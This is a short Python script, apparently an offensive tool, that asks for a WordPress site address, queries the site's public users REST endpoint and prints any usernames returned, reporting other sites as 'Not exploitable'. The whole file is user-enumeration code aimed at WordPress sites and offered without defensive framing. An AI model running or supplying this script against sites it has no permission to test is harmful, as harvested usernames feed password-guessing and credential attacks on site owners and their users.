# wp_users_extractor.py
import requests

url = input("WP Site (e.g. http://site.com): ").rstrip('/')
r = requests.get(url + "/wp-json/wp/v2/users")
if r.status_code == 200:
    print("[+] Users found:")
    print(r.text)
else:
    print("[-] Not exploitable")
